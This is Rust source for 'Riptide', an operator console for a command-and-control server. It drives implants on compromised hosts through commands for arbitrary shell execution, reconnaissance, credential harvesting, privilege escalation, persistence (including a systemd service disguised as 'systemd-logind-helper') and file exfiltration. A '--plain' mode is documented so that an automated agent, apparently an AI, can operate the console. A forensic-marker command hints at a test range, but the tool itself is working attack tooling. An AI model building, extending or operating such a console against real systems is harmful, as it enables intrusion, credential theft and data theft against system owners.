/// Riptide Operator Console — interactive REPL for managing implants.
///
/// Usage:
///   riptide-console                                    # connects to localhost:10337
///   riptide-console --server http://10.0.0.1:10337     # custom server
///   riptide-console --server https://c2:10337 --no-tls-verify
///   riptide-console --plain                            # PTY/agent-friendly: no line editor
///
/// `--plain` is for non-interactive drivers (the RAS TUA agent over an `incus exec -t`
/// pexpect PTY): it reads lines from stdin with no rustyline raw-mode redraws and flushes
/// stdout after each prompt so a `read_output` consumer sees the prompt and results.
use clap::Parser;
use rustyline::error::ReadlineError;
use rustyline::{DefaultEditor, Result as RlResult};

mod api;

#[derive(Parser)]
#[command(name = "riptide-console", about = "Riptide C2 Operator Console")]
struct Cli {
    #[arg(long, default_value = "http://127.0.0.1:10337")]
    server: String,

    #[arg(long)]
    no_tls_verify: bool,

    /// PTY/agent-friendly mode: plain stdin/stdout, no rustyline line editor.
    #[arg(long, default_value_t = false)]
    plain: bool,
}

#[tokio::main]
async fn main() -> RlResult<()> {
    let cli = Cli::parse();
    let client = api::C2Client::new(&cli.server, cli.no_tls_verify);

    // Verify connection
    match client.list_sessions().await {
        Ok(resp) => println!("Riptide console — {} — {} session(s)\n", cli.server, resp.count),
        Err(e) => eprintln!("[!] Cannot reach C2 at {}: {}\n", cli.server, e),
    }

    println!("Type 'help' for commands, 'quit' to exit.\n");
    use std::io::Write as _;
    let _ = std::io::stdout().flush();

    let mut selected_id: Option<String> = None;

    // rustyline editor only for the human (interactive) mode; --plain reads stdin directly
    // so there are no raw-mode escape sequences for a PTY consumer to parse.
    let mut rl = if cli.plain { None } else { Some(DefaultEditor::new()?) };
    if let Some(ref mut rl) = rl {
        let _ = rl.load_history("/tmp/.riptide_history");
    }

    loop {
        let prompt = if let Some(ref id) = selected_id {
            format!("[{}] > ", id.chars().take(8).collect::<String>())
        } else {
            "riptide> ".into()
        };

        let line = match read_line(&mut rl, &prompt, cli.plain) {
            Some(l) => l,
            None => break, // EOF
        };

        let line = line.trim().to_string();
        if line.is_empty() { continue; }
        if let Some(ref mut rl) = rl {
            let _ = rl.add_history_entry(&line);
        }

        let parts: Vec<&str> = line.splitn(2, ' ').collect();
        let cmd = parts[0];
        let arg = parts.get(1).unwrap_or(&"");

        match cmd {
            "quit" | "exit" | "q" => break,

            "help" | "?" => print_help(),

            "sessions" | "list" => {
                match client.list_sessions().await {
                    Ok(resp) => {
                        if resp.sessions.is_empty() {
                            println!("  (no active sessions)");
                        }
                        for s in &resp.sessions {
                            let ago = client::parse_ago(&s.last_seen);
                            println!("  {:12} {:30} {:8} {:6} {}",
                                s.hostname, s.implant_id, s.status, s.privileges, ago);
                        }
                    }
                    Err(e) => println!("  Error: {}", e),
                }
            }

            "use" | "select" => {
                if arg.is_empty() {
                    println!("  Usage: use <hostname-or-id>");
                } else {
                    match client.find_session(arg).await {
                        Some(s) => {
                            let id = s.implant_id.clone();
                            println!("  Selected: {} ({})", s.hostname, id);
                            println!("    IP: {} | OS: {} | UID: {} | Status: {}",
                                s.ip, s.os, s.uid, s.status);
                            selected_id = Some(id);
                        }
                        None => println!("  Session not found: {}", arg),
                    }
                }
            }

            "back" | "unselect" => {
                if selected_id.is_some() {
                    println!("  Deselected.");
                    selected_id = None;
                }
            }

            "listeners" => {
                let subparts: Vec<&str> = arg.splitn(2, ' ').collect();
                match subparts[0] {
                    "" => {
                        match client.get_listeners().await {
                            Ok(listeners) => {
                                if listeners.is_empty() { println!("  (no active listeners)"); }
                                for l in &listeners { println!("  :{} ({})", l.port, l.protocol); }
                            }
                            Err(e) => println!("  Error: {}", e),
                        }
                    }
                    "add" | "start" => {
                        let add_parts: Vec<&str> = subparts.get(1).unwrap_or(&"").splitn(2, ' ').collect();
                        let port_str = add_parts[0];
                        let proto = add_parts.get(1).unwrap_or(&"http");
                        if let Ok(port) = port_str.parse::<u16>() {
                            match client.start_listener(port, proto).await {
                                Ok(info) => println!("  Started: :{} ({})", info.port, info.protocol),
                                Err(e) => println!("  Error: {}", e),
                            }
                        } else {
                            println!("  Usage: listeners add <port> [http|https]");
                        }
                    }
                    "stop" | "remove" => {
                        if let Ok(port) = subparts.get(1).unwrap_or(&"").parse::<u16>() {
                            match client.stop_listener(port).await {
                                Ok(()) => println!("  Stopped listener on :{}", port),
                                Err(e) => println!("  Error: {}", e),
                            }
                        } else { println!("  Usage: listeners stop <port>"); }
                    }
                    _ => println!("  Usage: listeners [add <port>|stop <port>]"),
                }
            }

            // Commands that require a selected session
            cmd if selected_id.is_some() => {
                let id = selected_id.as_ref().unwrap();
                handle_session_cmd(&client, id, cmd, arg).await;
            }

            _ => println!("  Unknown command: {}. Type 'help'.", cmd),
        }

        // In plain mode, flush so a PTY consumer (the agent's read_output) sees every line
        // as it is printed rather than when a buffer fills.
        if cli.plain {
            let _ = std::io::stdout().flush();
        }
    }

    if let Some(ref mut rl) = rl {
        let _ = rl.save_history("/tmp/.riptide_history");
    }
    println!("bye.");
    Ok(())
}

/// Read one input line. rustyline in interactive mode; plain stdin in `--plain` mode.
/// Returns `None` on EOF / Ctrl-D (and Ctrl-C in plain mode, which mirrors readline's Eof).
fn read_line(rl: &mut Option<DefaultEditor>, prompt: &str, plain: bool) -> Option<String> {
    if plain {
        use std::io::Write as _;
        print!("{}", prompt);
        let _ = std::io::stdout().flush();
        let mut buf = String::new();
        match std::io::stdin().read_line(&mut buf) {
            Ok(0) => None,                 // EOF
            Ok(_) => Some(buf),            // includes the trailing newline
            Err(_) => None,
        }
    } else {
        let rl = rl.as_mut().unwrap();
        match rl.readline(prompt) {
            Ok(l) => Some(l),
            Err(ReadlineError::Interrupted | ReadlineError::Eof) => None,
            Err(_) => None,
        }
    }
}

async fn handle_session_cmd(client: &api::C2Client, id: &str, cmd: &str, arg: &str) {
    match cmd {
        "shell" => {
            if arg.is_empty() { println!("  Usage: shell <command>"); return; }
            let cid = client.queue(id, "shell", "exec", &serde_json::json!({"cmd": arg})).await;
            wait_and_show(client, id, cid, "shell").await;
        }
        "recon" => {
            let action = if arg.is_empty() { "passive" } else { arg };
            let cid = client.queue(id, "recon", action, &serde_json::json!({})).await;
            wait_and_show(client, id, cid, "recon").await;
        }
        "discovery" | "discover" | "enum" => {
            let action = if arg.is_empty() { "all" } else { arg };
            let cid = client.queue(id, "discovery", action, &serde_json::json!({})).await;
            wait_and_show(client, id, cid, "discovery").await;
        }
        "creds" | "harvest" => {
            let mode = if arg.is_empty() { "in_memory" } else { arg };
            let cid = client.queue(id, "creds", "harvest", &serde_json::json!({"mode": mode})).await;
            wait_and_show(client, id, cid, "creds").await;
        }
        "privesc" => {
            let method = if arg.is_empty() { "copyfail" } else { arg };
            let cid = client.queue(id, "privesc", method, &serde_json::json!({})).await;
            wait_and_show(client, id, cid, "privesc").await;
        }
        "persist" => {
            let subparts: Vec<&str> = arg.splitn(2, ' ').collect();
            let action = subparts[0];
            let extra = subparts.get(1).unwrap_or(&"");
            let args = match action {
                "install" => if extra.is_empty() {
                    serde_json::json!({})
                } else {
                    serde_json::json!({"path": extra})
                },
                "systemd" => serde_json::json!({"service_name": if extra.is_empty() {"systemd-logind-helper"} else {extra}}),
                _ => serde_json::json!({}),
            };
            if action.is_empty() {
                println!("  Usage: persist install [path]|cron|systemd [name]|bashrc");
                return;
            }
            let cid = client.queue(id, "persist", action, &args).await;
            wait_and_show(client, id, cid, "persist").await;
        }
        "exfil" => {
            if arg.is_empty() { println!("  Usage: exfil <path>"); return; }
            let cid = client.queue(id, "exfil", "file", &serde_json::json!({"path": arg})).await;
            wait_and_show(client, id, cid, "exfil").await;
        }
        "download" => {
            if arg.is_empty() { println!("  Usage: download <path>"); return; }
            let cid = client.queue(id, "file", "read", &serde_json::json!({"path": arg})).await;
            wait_and_show(client, id, cid, "download").await;
        }
        "marker" => {
            let location = if arg.is_empty() { "operator" } else { arg };
            let cid = client.queue(id, "marker", "write", &serde_json::json!({"location": location})).await;
            wait_and_show(client, id, cid, "marker").await;
        }
        "info" => {
            let cid = client.queue(id, "system", "info", &serde_json::json!({})).await;
            wait_and_show(client, id, cid, "system").await;
        }
        "sleep" => {
            if let Ok(secs) = arg.parse::<u64>() {
                let cid = client.queue(id, "system", "sleep", &serde_json::json!({"secs": secs})).await;
                wait_and_show(client, id, cid, "system").await;
            } else { println!("  Usage: sleep <seconds>"); }
        }
        "exit" | "kill" => {
            let cid = client.queue(id, "system", "exit", &serde_json::json!({})).await;
            match cid {
                Ok(ref c) => println!("  Queued exit command ({}).", &c[..8]),
                Err(e) => println!("  Error: {}", e),
            }
        }
        _ => println!("  Unknown command: {}. Type 'help'.", cmd),
    }
}

async fn wait_and_show(client: &api::C2Client, id: &str, cid: Result<String, String>, label: &str) {
    let cid = match cid {
        Ok(c) => c,
        Err(e) => { println!("  Error: {}", e); return; }
    };
    print!("  [{}] waiting.", label);
    let mut dots = 0;
    loop {
        match client.command_result(id, &cid).await {
            Some(result) => {
                println!("\r  [{}] done:", label);
                if let Some(obj) = result.as_object() {
                    for (k, v) in obj {
                        if let Some(s) = v.as_str() {
                            if !s.is_empty() {
                                for line in s.lines() { println!("    {}", line); }
                            }
                        } else if let Some(n) = v.as_u64() {
                            if k != "exit_code" { println!("    {}: {}", k, n); }
                        } else if let Some(b) = v.as_bool() {
                            println!("    {}: {}", k, b);
                        } else if v.is_object() || v.is_array() {
                            let s = serde_json::to_string_pretty(v).unwrap_or_default();
                            for line in s.lines().take(10) { println!("    {}", line); }
                        }
                    }
                }
                break;
            }
            None => {
                dots = (dots + 1) % 4;
                print!("\r  [{}] waiting{}", label, ".".repeat(dots));
                tokio::time::sleep(std::time::Duration::from_secs(2)).await;
            }
        }
    }
}

fn print_help() {
    println!(r#"
  ── Navigation ──
  sessions, list          List active implant sessions
  use <hostname-or-id>    Select a session
  back                    Deselect session

  ── Listeners ──
  listeners               List active beacon listeners
  listeners add <port> [http|https]
  listeners stop <port>

  ── Session Commands ──
  shell <command>         Execute arbitrary shell command
  recon [passive|active|arp]  Network reconnaissance
  discovery [procs|users|suid|services|all]  Host discovery
  creds [in_memory|shell]     Credential harvesting
  privesc [copyfail|pkexec]   Privilege escalation
  persist install [path]|cron|systemd [name]|bashrc   Persistence
  exfil <path>            Exfiltrate file
  download <path>         Download file from implant
  marker [label]          Write forensic marker
  ── System ──
  info                    Implant metadata (hostname, PID, OS)
  sleep <seconds>         Change beacon interval
  exit                    Terminate implant
  ── Console ──
  help                    Show this help
  quit, exit, q           Exit console
"#);
}

mod client {
    
    pub fn parse_ago(last_seen: &str) -> String {
        let parsed = chrono::DateTime::parse_from_rfc3339(last_seen)
            .unwrap_or_else(|_| chrono::DateTime::UNIX_EPOCH.into());
        let now: chrono::DateTime<chrono::Utc> = chrono::Utc::now();
        let secs = now.signed_duration_since(parsed).num_seconds();
        if secs < 60 { format!("{}s ago", secs) }
        else if secs < 3600 { format!("{}m ago", secs / 60) }
        else if secs < 86400 { format!("{}h ago", secs / 3600) }
        else { format!("{}d ago", secs / 86400) }
    }
}
